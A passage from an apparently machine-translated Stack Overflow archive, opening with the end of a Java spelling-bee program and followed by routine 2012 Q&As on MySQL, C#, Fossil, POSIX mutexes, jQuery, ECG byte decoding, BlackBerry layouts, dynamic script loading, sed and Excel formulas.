        Word temp_word = new Word(gui.word_manager.input_field.getText(), sound_data);
        words.add(temp_word);
        temp_word.play();

        if (words.size() == 1) {
            choose_word();
        }

        gui.word_manager.populate_list_on_new_thread();
        save_words_to_disk();
    }

    public void choose_word() {
        if (current_word != null) {
            String old_word = current_word.spelling;

            if (words.size() > 1) {
                while (old_word.equals(current_word.spelling)) {
                    current_word = words.get(new Random().nextInt(words.size()));
                }
            } else {
                current_word = words.get(0);
            }
        } else {
            if (words.size() > 0) {
                current_word = words.get(new Random().nextInt(words.size()));
            }

        }
    }

    public void prompt_word() {
        if (current_word != null) {
            current_word.play();
        }
    }

    public void process_keyboard_input(KeyEvent e) {
        char user_input = e.getKeyChar();

        //verify input
        if (!input_ok(user_input)) {
            return;
        }

        switch (user_input) {
            case '0':
                prompt_word();
                return;
            case '1':
                gui.show_word_manager();
                return;
            default:
                break;
        }

        String result_string = gui.main_gui.input_label.getText();

        gui.main_gui.input_label.setText(result_string + Character.toString(user_input));

        result_string = gui.main_gui.input_label.getText();

        String answer_string = current_word.spelling;

        if (result_string.equalsIgnoreCase(answer_string)) {
            SoundPlayer.play("ding.wav");
            gui.main_gui.last_word_label.setText(gui.main_gui.input_label.getText().toLowerCase());
            gui.main_gui.input_label.setText("");
            choose_word();
            prompt_word();
        }

        //check to see if input is correct so far
        int result_length = result_string.length();
        String partial_result = result_string.substring(0, result_length);
        String partial_answer = answer_string.substring(0, result_length);
        if (!partial_result.equalsIgnoreCase(partial_answer)) {
            SoundPlayer.play("wrong.wav");
            gui.main_gui.input_label.setText("");
        }

    }

    public boolean input_ok(char input_value) {
        boolean result = false;

        switch (new Character(input_value).toString().toLowerCase().charAt(0)) {
            case 'a':
            case 'b':
            case 'c':
            case 'd':
            case 'e':
            case 'f':
            case 'g':
            case 'h':
            case 'i':
            case 'j':
            case 'k':
            case 'l':
            case 'm':
            case 'n':
            case 'o':
            case 'p':
            case 'q':
            case 'r':
            case 's':
            case 't':
            case 'u':
            case 'v':
            case 'w':
            case 'x':
            case 'y':
            case 'z':
            case '0':
            case '1':
                result = true;
        }

        return result;
    }
}

class Word implements Serializable {

    public String spelling = null;
    public byte[] audio_data = null;

    public Word(String spelling, byte[] audio_data) {
        this.spelling = spelling;
        this.audio_data = audio_data;
        System.out.println("");
    }

    public void play() {
        SoundPlayer.play_data(audio_data);
    }
}

class SoundPlayer {

    static AudioFormat audio_format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100.0F, 16, 2, 4, 44100.0F, false);

    static public void play(String path) {
        try {
            Clip clip = AudioSystem.getClip();

            InputStream audio_src = SpellingBee.class.getResourceAsStream(path);
            InputStream buffered_in = new BufferedInputStream(audio_src);
            AudioInputStream audioStream = AudioSystem.getAudioInputStream(buffered_in);

            clip.open(audioStream);
            clip.start();
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
    }

    static public void play_data(byte[] data) {
        Clip clip = null;
        try {
            clip = AudioSystem.getClip();
        } catch (Exception e) {
            System.err.println("1 " + e.getMessage());
        }

        try {

            clip.open(audio_format, data, 0, data.length);

        } catch (LineUnavailableException e) {
            System.err.println("2a " + e.getMessage());
        } catch (IllegalArgumentException e) {
            System.err.println("2b " + e.getMessage());
        } catch (IllegalStateException e) {
            System.err.println("2c " + e.getMessage());
        } catch (SecurityException e) {
            System.err.println("2d " + e.getMessage());
        }

        try {
            clip.start();
        } catch (Exception e) {
            System.err.println("3 " + e.getMessage());
        }

    }
}

class AudioRecorder {

    static boolean stopCapture = false;
    static ByteArrayOutputStream byteArrayOutputStream;
    static AudioFormat audioFormat = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100.0F, 16, 2, 4, 44100.0F, false);
    static TargetDataLine targetDataLine;
    static private byte[] audioData = null;
    public static Logic logic = null;

    static public byte[] get_audio_data() {
        return audioData;
    }

    static public void init() {
        try {
            DataLine.Info dataLineInfo = new DataLine.Info(TargetDataLine.class, audioFormat);
            targetDataLine = (TargetDataLine) AudioSystem.getLine(dataLineInfo);
            targetDataLine.open(audioFormat);
        } catch (Exception e) {
            System.err.println(e);
        }
    }

    static public void captureAudio() {
        try {
            targetDataLine.start();
            //Create a thread to capture the microphone data and start it
            //running. It will run until the Stop button is clicked.
            Thread captureThread = new Thread(new CaptureThread());
            captureThread.start();
        } catch (Exception e) {
            System.out.println("4 " + e);
            System.exit(0);
        }//end catch
    }//end captureAudio method

    static class CaptureThread extends Thread {
        //An arbitrary-size temporary holding buffer

        byte tempBuffer[] = new byte[10000];

        @Override
        public void run() {
            byteArrayOutputStream = new ByteArrayOutputStream();
            stopCapture = false;
            try {
                //stopCapture will be set by another thread
                while (!stopCapture) {
                    //Read data from the internal buffer of the data line.
                    int cnt = targetDataLine.read(tempBuffer, 0, tempBuffer.length);
                    if (cnt > 0) {
                        byteArrayOutputStream.write(tempBuffer, 0, cnt);
                    }
                }

                byteArrayOutputStream.close();
                audioData = byteArrayOutputStream.toByteArray();
                logic.process_new_word(audioData);
                System.out.println();

            } catch (Exception e) {
                System.out.println("capture thread " + e);
                System.exit(0);
            }//end catch
        }//end run
    }//end inner class CaptureThread
}//end outer class AudioCapture01.java 
```

# mysql - 为 mysql 中的列保留空间以进行有效的更新？

> ID：11243372
> 
> 赞同：1
> 
> 时间：2012-06-28T11:11:48.047
> 
> 标签：mysql, performance

我需要以高速率将数据附加到 BLOB 列。我想默认的 mysql 行为是随着 blob 变大而重新定位磁盘上的数据，因此对于大量的 UPDATE，性能会受到影响，而不是插入新行？

如何让 mysql 在磁盘上保留一个块以加快此类更新？

我目前没有带有特定存储引擎的表 - 我正在尝试验证这在 mysql 支持的任何引擎中是否可行。

# c# - 如何搜索子字符串

> ID：11243373
> 
> 赞同：1
> 
> 时间：2012-06-28T11:11:51.553
> 
> 标签：c#, linq-to-xml

我用这种类型的几个节点检索 xml

```
<pickUpPoint puCost="0" code4county="UK*LINCS" puKey="C021P008">
    Louth
</pickUpPoint> 
```

我得到了一个由puKey 和节点的实际值组成的字符串（即C021P008Louth）。我想要实现的是在整个文档中搜索实际节点，但我目前无法做这样的事情

```
xDataForLINQ.Descendants("pickUpPoint")
            .Where(pp =>(tourPickUp.Contains(pp.Attribute("puKey").Value)) = true)
            .FirstOrDefault(); 
```

然后检查该值是否与我的字符串的第二部分匹配（也使用包含）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:06:24.203

也许使用

```
xDataForLINQ.Descendants("pickUpPoint")
            .FirstOrDefault(p => (string) p.Attribute("puKey") + p.Value == tourPickUp) 
```

更清晰，更精确。

# dvcs - Fossil：“不是有效的存储库” - 已删除的存储库

> ID：11243374
> 
> 赞同：0
> 
> 时间：2012-06-28T11:11:58.257
> 
> 标签：dvcs, fossil

我是第一次尝试化石，并在几分钟内搞砸了。我创建了一个存储库，然后显然在错误的文件夹等中运行了命令，最终删除了测试存储库，以便重新启动。（在某处我读到化石是“自包含的”，所以我想，删除存储库文件就可以了。删除化石存储库的正确方法是什么？）

现在，对于我尝试的几乎每个命令（包括“所有重建”），我都会收到错误“不是有效的存储库”以及已删除的存储库名称。

现在怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:35:56.997

根据[这篇文章](http://www.mail-archive.com/fossil-users@lists.fossil-scm.org/msg02490.html)：

> 仅当 Fossil 尝试测量存储库文件的大小并发现文件不存在或文件大小小于 1024 字节时，才会出现“不是有效的存储库”错误。它通过在文件上调用 stat() 并查看 stat.st_size 字段来做到这一点。

您似乎有丢失或被截断的 Fossil 文件。确保您实际上已经删除了存储库文件，并且您的文件系统实际上已经释放了文件句柄。Fossil 将一些存储库信息存储在*~/.fossil*中，因此您可能也需要将其删除。

```
rm ~/.fossil 
```

在极端情况下，您可能需要在删除此文件后重新启动，以确保您使用的是全新的状态。

如果您仍然遇到问题，请尝试在不同的目录中创建一个新的存储库文件。例如：

```
cd /tmp
fossil init foo.fsl
fossil open foo.fsl
fossil close 
```

如果一切顺利，您将不得不寻找存储库中潜伏的任何残余物。只要关闭文件句柄，就没有理由不能删除 foo.fsl （或其他任何东西）并将其称为好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T18:02:14.673

我刚刚在 Windows 上遇到了完全相同的问题。我似乎也找到了解决办法。这就是我所做的。我不能保证它是一个通用的解决方案，甚至是一个好的解决方案。在：

```
C:\Users\mywindowsusername\AppData\Local 
```

有一个名为 _fossil 的文件和一个名为 VirtualStore 的目录/文件夹。我都删除了。这似乎已经删除了存储库的所有痕迹。请注意，与您的情况一样，存储库仍处于“打开”状态。

编辑：进一步试验后，VirtualStore 似乎是一个临时目录，在提交后会消失（一个 .fossil 文件将出现在目标目录中）。

我的错误是在根目录创建存储库并克隆：fossil 继续克隆整个 C 驱动器。可能是新手常见的错误。

# c - POSIX 共享 - 递归互斥锁

> ID：11243382
> 
> 赞同：0
> 
> 时间：2012-06-28T11:12:12.337
> 
> 标签：c, posix, mutex

我正在研究Linux。在我的代码中，我试图运行一些试图锁定 RECURSIVE 互斥锁的线程（例如 2 个），但只有一个线程可以访问并锁定互斥锁，而第二个线程即使在第一个线程之后也会出现 EBUSY 错误线程已将其解锁。我认为这是因为互斥锁是私有的而不是共享的。

我正在尝试将互斥锁设置为 RECRUSIVE 和 SHARED，如下所示：

```
 void
MutexCreate(pthread_mutex_t* _m)
{
    pthread_mutexattr_t attr; 

    pthread_mutexattr_init(&attr);
    pthread_mutexattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_mutexattr_settype(&attr, PTHREAD_MUTEX_RECURSIVE);
    pthread_mutex_init(_m, &attr); 
} 
```

（我确实检查了函数错误——它们都返回 0）

即使我尝试通过以下方式使其成为默认共享互斥锁：

```
 void
MutexCreate(pthread_mutex_t* _m)
{
    pthread_mutexattr_t attr; 

    pthread_mutexattr_init(&attr);
    pthread_mutexattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_mutex_init(_m, &attr); 
} 
```

它仍然是PRIVET。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:54:41.060

如果您在同一进程中确实有两个线程，则该`pshared`属性不应该有影响。

`EBUSY`只允许作为 的回报`pthread_mutex_trylock`，所以我想你使用了这个。

我唯一的解释是你可能用第一个线程多次锁定你的互斥锁。`lock`并且`unlock`总是成对出现，确保你有和你一样多`unlock`的`lock`s。

# jquery-ui - 加载带有幻灯片效果的 AJAX

> ID：11243384
> 
> 赞同：0
> 
> 时间：2012-06-28T11:12:16.753
> 
> 标签：jquery-ui, jquery

我的计划是创建一个内容 DIV，在该 div 中我将通过 AJAX 加载内容。我希望已经加载的页面向左滑动，使用 circle.gif 淡入加载页面，然后淡入新内容等其余页面。

我有这段代码，但它到顶部而不是左边，我认为没有 scrollLeft。

```
$("#someDiv").slideUp("slow").load('blah.html', function() {
    $(this).slideDown("slow");
}); 
```

还有这个：

```
$('.cont a').click(function() {
        var page = $(this).attr('href');
        $('.p-list').prepend('<div class="loader"> </div>');
        $('.p-list').slideUp("slow").load(page +" .proj", function() {
             $(this).fadeIn("slow"); //or show or slideDown
        });
        return false;
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:14:39.660

`animate`与这样的属性一起使用`left`：

```
$("#someDiv").slideUp("slow").load('blah.html', function() {
    $(this).animate({'left' : 'show'});
}); 
```

您还可以根据需要使用`right`, `margin-left`, `margin-right`with作为值。`show`

要通过水平滑动将它们隐藏起来，请改用`hide`value。

确保首先隐藏元素并为这些属性设置适当的 CSS 值。

# .net - ut ubox vs 2000 心电图机数据值

> ID：11243392
> 
> 赞同：0
> 
> 时间：2012-06-28T11:12:45.137
> 
> 标签：.net

我正在研究 ut ubox vs 2000 心电图机。这台 ecg 机器在下面给出的 LAN（局域网）上以字节数组形式传输其数据。

我怎样才能从这个数组中得到心电图波值。

我的代码如下。但我无法获得实际值。

```
byte[] tst = {0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xFF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xFF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xFF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xFF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xFF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xFF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xFF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xEF, 0xFD, 0xFF, 0xCF, 0xFC, 0xFF, 0xDF, 0xFE, 0xFF, 0xFF, 0xFD, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xFF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xEF, 0xFE, 0xFF, 0xFF, 0xFE };

string strresult = "";
for (int j = 0; j < tst.Length-1; j+=2)
{
    strHex = String.Format("{0:x2}", tst[j]);
    strHex += String.Format("{0:x2}", tst[j + 1]);
    strresult = strresult + "," + short.Parse(strHex, System.Globalization.NumberStyles.HexNumber);
}

Console.WriteLine(strresult); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:27:10.327

那么您想将字节数组（8 位）转换为字数组（16 位）吗？

尝试[BitConverter.ToUInt()](http://msdn.microsoft.com/en-us/library/system.bitconverter.touint16)方法，它从一个数组中获取两个字节并返回一个 int16 aka short

```
for (int j = 0; j < tst.Length-1; j+=2){
    strresult = strresult + "," + BitConverter.ToUInt16( tst, j ).toString();
} 
```

选择首选方法（toUInt16 或 toInt16 取决于有符号或无符号值，并注意[小端或大端](http://en.wikipedia.org/wiki/Endianness)，您可能需要在某些时候切换字节顺序。

（代码未经语法测试）

# blackberry - 如何在单屏上显示黑莓中的几个数据

> ID：11243396
> 
> 赞同：1
> 
> 时间：2012-06-28T11:13:00.737
> 
> 标签：blackberry, blackberry-simulator, blackberry-eclipse-plugin

嗨，朋友，我如何在一个屏幕上显示黑莓中的几个数据。例如：

* * *

```
current Date------------value.
Name------------------- value.
roll--------------------value.
email-id----------------value.
phone-no----------------value.
pass--------------------value.
class-------------------value.
sex---------------------value.
college-----------------value.
city--------------------value.
state-------------------value.
pin code----------------value.
country-----------------value. 
```

```
public LabelField lbSr, lbDate, lbAllo, lbMob, lbDetail, lbRemark, lbSlaDate, lbEmail, lbStatus, lbspace;
public LabelField lb1Sr, lb1Date, lb1Allo, lb1Mob, lb1Detail, lb1Remark, lb1SlaDate, lb1Email, lb1Status;
public JustifiedHorizontalFieldManager jhfm1,jhfm2,jhfm3,jhfm4,jhfm5,jhfm6,jhfm7,jhfm8,jhfm9;
VerticalFieldManager vfm=new VerticalFieldManager(VerticalFieldManager.VERTICAL_SCROLL);

lb1Sr = new LabelField("SRNo         :");
lb1Sr.setColor(Color.BLACK);

lbSr = new LabelField(strSerno);
lbSr.setColor(Color.BLACK);

lb1Date = new LabelField("SRDate      :");
lb1Date.setColor(Color.BLACK);

lbDate = new LabelField(strDate);
lbDate.setColor(Color.BLACK);

lb1Allo = new LabelField("AllocDate   :");
lb1Allo.setColor(Color.BLACK);

lbAllo = new LabelField(strAllo);
lbAllo.setColor(Color.BLACK);

lb1Mob = new LabelField("MobNo       :");
lb1Mob.setColor(Color.BLACK);

lbMob = new LabelField(strMob);
lbMob.setColor(Color.BLACK);

lb1Detail = new LabelField("SRDetails   :");
lb1Detail.setColor(Color.BLACK);

lbDetail = new LabelField(strDetail);
lbDetail.setColor(Color.BLACK);

lb1Remark = new LabelField("Remarks    :");
lb1Remark.setColor(Color.BLACK);

lbRemark = new LabelField(strRemark);
lbRemark.setColor(Color.BLACK);

lb1SlaDate = new LabelField("SLADate :");
lb1SlaDate.setColor(Color.BLACK);

lbSlaDate = new LabelField(strSldate);
lbSlaDate.setColor(Color.BLACK);

lb1Email = new LabelField("Email :");
lb1Email.setColor(Color.BLACK);

lbEmail = new LabelField(strEmail);
lbEmail.setColor(Color.BLACK);

lb1Status = new LabelField("Status :");
lb1Status.setColor(Color.BLACK);

lbStatus = new LabelField(strStatus);
lbStatus.setColor(Color.BLACK);

jhfm1=new JustifiedHorizontalFieldManager(lb1Sr, lbSr, true);
vfm.add(jhfm1);

jhfm2=new JustifiedHorizontalFieldManager(lb1Date, lbDate, true);
vfm.add(jhfm2);

jhfm3=new JustifiedHorizontalFieldManager(lb1Allo, lbAllo, true);
vfm.add(jhfm3);

jhfm4=new JustifiedHorizontalFieldManager(lb1Mob, lbMob, true);
vfm.add(jhfm4);

 hfm5=new JustifiedHorizontalFieldManager(lb1Detail, lbDetail, true);
vfm.add(jhfm5);

jhfm6=new JustifiedHorizontalFieldManager(lb1Remark, lbRemark, true);
vfm.add(jhfm6);

jhfm7=new JustifiedHorizontalFieldManager(lb1SlaDate, lbSlaDate, true);
vfm.add(jhfm7);

jhfm8=new JustifiedHorizontalFieldManager(lb1Email, lbEmail, true);
vfm.add(jhfm8);

jhfm9=new JustifiedHorizontalFieldManager(lb1Status, lbStatus, true);
vfm.add(jhfm9);

add(vfm); 
```

我想使用两侧滚动选项显示所有数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:59:58.487

试试这个代码 -

```
VerticalFieldManager vfm=new VerticalFieldManager(VerticalFieldManager.VERTICAL_SCROLL);
LabelField date=new LabelField("Date :");
LabelField date_value=new LabelField(value);
JustifiedHorizontalFieldManager jfm_date=new JustifiedHorizontalFieldManager(date,date_value, true);
vfm.add(jfm_date);
LabelField name=new LabelField("Name:");
LabelField name_value=new LabelField(value);
JustifiedHorizontalFieldManager jfm_name=new JustifiedHorizontalFieldManager(name,name_value, true);
vfm.add(jfm_name);
add(vfm); 
```

依此类推....添加所有这样的字段。

JustifiedHorizo​​ntalFieldManager 类如下 -

```
public class JustifiedHorizontalFieldManager extends Manager
{
    private static final int SYSTEM_STYLE_SHIFT = 32;

public Field _leftField;
public Field _rightField;

private boolean _giveLeftFieldPriority;

public JustifiedHorizontalFieldManager( Field leftField, Field rightField, boolean giveLeftFieldPriority )
{
    this( leftField, rightField, giveLeftFieldPriority, Field.USE_ALL_WIDTH );
}

public JustifiedHorizontalFieldManager( Field leftField, Field rightField, boolean giveLeftFieldPriority, long style )
{
    super( style );

    _leftField = leftField;
    _rightField = rightField;

    add( _leftField );
    add( _rightField );

    _giveLeftFieldPriority = giveLeftFieldPriority;
}

public JustifiedHorizontalFieldManager( boolean giveLeftFieldPriority, long style )
{
    super( style );
    _giveLeftFieldPriority = giveLeftFieldPriority;
}

public void addLeftField( Field field )
{
    if( _leftField != null ) {
        throw new IllegalStateException();
    }
    _leftField = field;
    add( _leftField );
}

public void addRightField( Field field )
{
    if( _rightField != null ) {
        throw new IllegalStateException();
    }
    _rightField = field;
    add( _rightField );
}

public int getPreferredWidth()
{
    return _leftField.getPreferredWidth() + _rightField.getPreferredWidth();
}

public int getPreferredHeight()
{
    return Math.max( _leftField.getPreferredHeight(), _rightField.getPreferredHeight() );
}

protected void sublayout( int width, int height )
{
    Field firstField;
    Field secondField;
    if( _giveLeftFieldPriority ) {
        firstField = _leftField;
        secondField = _rightField;
    } else {
        firstField = _rightField;
        secondField = _leftField;
    }

    int maxHeight = 0;

    int availableWidth = width;
    availableWidth -= _leftField.getMarginLeft();
    availableWidth -= Math.max( _leftField.getMarginRight(), _rightField.getMarginLeft() );
    availableWidth -= _rightField.getMarginRight();

    layoutChild( firstField, availableWidth, height - firstField.getMarginTop() - firstField.getMarginBottom() );
    maxHeight = Math.max( maxHeight, firstField.getMarginTop() + firstField.getHeight() + firstField.getMarginBottom() );
    availableWidth -= firstField.getWidth();

    layoutChild( secondField, availableWidth, height - secondField.getMarginTop() - secondField.getMarginBottom() );
    maxHeight = Math.max( maxHeight, secondField.getMarginTop() + secondField.getHeight() + secondField.getMarginBottom() );
    availableWidth -= secondField.getWidth();

    if( !isStyle( Field.USE_ALL_HEIGHT ) ) {
        height = maxHeight;
    }
    if( !isStyle( Field.USE_ALL_WIDTH ) ) {
        width -= availableWidth;
    }

    setPositionChild( _leftField, _leftField.getMarginLeft(), getFieldY( _leftField, height ) );
    setPositionChild( _rightField, width - _rightField.getWidth() - _rightField.getMarginRight(), getFieldY( _rightField, height ) );

    setExtent( width, height );
}

private int getFieldY( Field field, int height )
{
    switch( (int)( ( field.getStyle() & FIELD_VALIGN_MASK ) >> SYSTEM_STYLE_SHIFT ) ) {
        case (int)( FIELD_BOTTOM >> SYSTEM_STYLE_SHIFT ):
            return height - field.getHeight() - field.getMarginBottom();
        case (int)( FIELD_VCENTER >> SYSTEM_STYLE_SHIFT ):
            return field.getMarginTop() + ( height - field.getMarginTop() - field.getHeight() - field.getMarginBottom() ) / 2;
        default:
            return field.getMarginTop();
    }
}

public Field getLeftField()
{
    return _leftField;
}

public Field getRightField()
{
    return _rightField;
}

public void replace( Field oldField, Field newField )
{
    if( oldField == newField ) {
        // Nothing to do
        return;
    }

    if( oldField == _leftField ) {
        _leftField = newField;
    } else if( oldField == _rightField ) {
        _rightField = newField;
    }
    add( newField );
    delete( oldField );
}
} 
```

# javascript - 是否可以根据条件调用和执行外部 Javascript 文件？

> ID：11243398
> 
> 赞同：0
> 
> 时间：2012-06-28T11:13:07.330
> 
> 标签：javascript

我知道我可以使用以下语法从 HTML 中运行外部 Javascript 文件：

```
<script type="text/javascript"
src="http://somesite.com/location/of/javascript.js">
</script> 
```

这将导致在`http://somesite.com/location/of/javascript.js`浏览器读取该 HTML 行时运行。

但是有没有办法可以从 Javascript 中运行外部 Javascript 文件？就像是：

```
if (x == 1)
{
 run this! -> http://somesite.com/location/of/javascript.js;
} 
```

显然这不是有效的代码。但是我找不到任何可能是正确方法的示例（如果存在），因为我在 Google 搜索中找到的所有帮助文本都告诉我如何从 HTML 中运行 Javascript

我知道我可以包含一个 Javascript 文件，然后在其中调用函数。但是，在这种情况下，我无法控制`http://somesite.com/location/of/javascript.js`它，它被设计为在调用它的那一刻执行。我无法改变它的工作方式，所以我需要弄清楚如何在正确的时间以正确的方式调用它。

有没有一种方法可以根据条件语句立即调用​​和执行它？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-28T11:16:07.570

是的，在纯 Javascript 中，您可以动态加载 javascript

```
var s = document.createElement("script");
s.src = "test.js";
document.body.appendChild(s); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:16:13.043

有一种方法...

```
var extfile = document.createElement('script')
extfile.setAttribute("type","text/javascript")
extfile.setAttribute("src", external_jsfilename)
document.getElementsByTagName("head")[0].appendChild(extfile) 
```

就那么简单 ....

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T11:17:38.777

使用 jQuery 的[.getScript()](http://api.jquery.com/jQuery.getScript/)文件将被加载然后执行

```
if (x == 1)
    {
     $.getScript( "http://somesite.com/location/of/javascript.js");
    } 
```

# regex - sed 匹配第一个重复出现的字符

> ID：11243406
> 
> 赞同：0
> 
> 时间：2012-06-28T11:13:44.980
> 
> 标签：regex, bash, sed

我在 "(" 之后显示所有内容的正则表达式：

```
 echo "apples (orange) (plum)" | sed -re 's/^.+\(//' 
```

输出 ： `plum)`

预期输出：`orange) (plum)`

如何捕捉第一个出现的字符而不是最后一个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:21:23.363

```
echo "apples (orange) (plum)" | sed -re 's/^[^(]+\(//' 
```

. 匹配任何字符，因此 sed 监视该行中的最后一个括号。因此`.`数学`(`和 `^[^(]+\(`数学`apples (orange) (`。因此，您需要按照您的建议使用`[^(]*`to not match any `(`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:35:49.057

不能。.* 和 .+ 总是贪婪的。不过，还有其他方法可以做到这一点。

删除所有前导`(`非

```
$ sed 's/[^(]*(//' <<<'apples (orange) (plum)'
orange) (plum) 
```

或者几乎等效而不是真正的改进将使用一个组来保存第二部分。

```
$ sed 's/[^(]*(\(.*\)$/\1/' <<<'apples (orange) (plum)'
orange) (plum) 
```

# xcode - 戴上内容过滤器后的OpenGL奇怪视图

> ID：11243408
> 
> 赞同：0
> 
> 时间：2012-06-28T11:13:51.350
> 
> 标签：xcode, cocoa, opengl

我试图通过 Interface Builder 放置一个内容过滤器，然后将其删除。但在那之后，OpenGLView 的效果仍然很奇怪： ![在此处输入图像描述](../Images/e89d69ddb1aaa782a90a9f41006162a9.png) 我怎样才能删除它？

PS它在调整窗口大小时发生变化。有时，启动应用程序后，整个屏幕很乱，但是当我调整窗口大小时，它消失了，变成了一个女巫显示在脚上

# javascript - 突出显示一组节点及其之间的关系

> ID：11243414
> 
> 赞同：2
> 
> 时间：2012-06-28T11:14:16.603
> 
> 标签：javascript, svg, graph, d3.js, force-layout

我正在使用 D3 处理力导向图，并且我在图形区域旁边的单独表格中显示了图形中显示的所有节点。我在显示的表格中有复选框，这使我可以选择节点。

我试图突出节点和它们之间的关系。我一直从这个示例中获取指针[Highlight selected node, its links, and its children in a D3 forcedirected graph](https://stackoverflow.com/questions/8739072/highlight-selected-node-its-links-and-its-children-in-a-d3-js-force-directed-g)。此示例适用于一个特定节点及其子节点，但如果它们之间有任何关系，我会尝试突出显示多个节点。

对此的任何帮助都将非常有用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T20:56:53.087

我没有使用力导向图，而是使用“[径向轮毂和轮辐图](http://bl.ocks.org/3169420)”（又名“[径向轮](http://bl.ocks.org/3169420)”），但前提应该是相同的。在我的示例中，关系由圆弧表示，关系中的节点位于圆弧的任一端。在示例中，您将看到我如何根据类型同时选择特定节点和/或关系（即，将鼠标悬停在任何弧或节点名称上）或许多节点和关系（将鼠标悬停在颜色编码类型键上）。

在任一选择示例中，归结为为图形中的每个元素分配唯一标识符。您可以通过搜索 .attr("class"...) 和 .attr("id"...) 语句来了解我是如何做到这一点的。一旦您分配了此类唯一标识符，您就可以使用它们来创建选择组合。您可以看到我如何在 .on("mouseover", ...) 函数中执行此类选择。

顺便说一句，您能否将您的示例发布到 bl.ocks.org？如果我们能看到您的代码，会更容易为您提供帮助。

我希望这有帮助。

我最好的，

坦率

# excel - 从excel中的单元格获取电子邮件地址

> ID：11243423
> 
> 赞同：3
> 
> 时间：2012-06-28T11:14:58.590
> 
> 标签：excel, excel-2007, excel-formula

如何从包含更多记录的单元格中获取电子邮件 ID？

例如，单元格*A1*具有以下值：

> 谷歌rockstar@xyz.com www.google.com

我想将**rockstar@xyz.com**从单元格*A1*复制到*B1*。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-28T11:38:54.420

您应该使用`RIGHT`,`LEFT`和`FIND`函数。这对我有用：

`=LEFT(RIGHT(A1,LEN(A1)-FIND(" ",A1,1)),FIND(" ",RIGHT(A1,LEN(A1)-FIND(" ",A1,1)),1))`

我使用空格字符来剪切字符串，但它仅在电子邮件地址位于中间位置时才有效。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-19T17:52:11.670

[@ArtiBucco 的回答](https://stackoverflow.com/a/11243796/1369235)是正确的。但包含`TRIM()`函数也适用于多个空间。

`=TRIM(RIGHT(SUBSTITUTE(LEFT(A1,FIND("@",A1)-1)," ",REPT(" ",99)),99))&MID(A1,FIND("@",A1),FIND(" ",A1&" ",FIND("@",A1))-FIND("@",A1))`

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-10-07T06:54:58.967

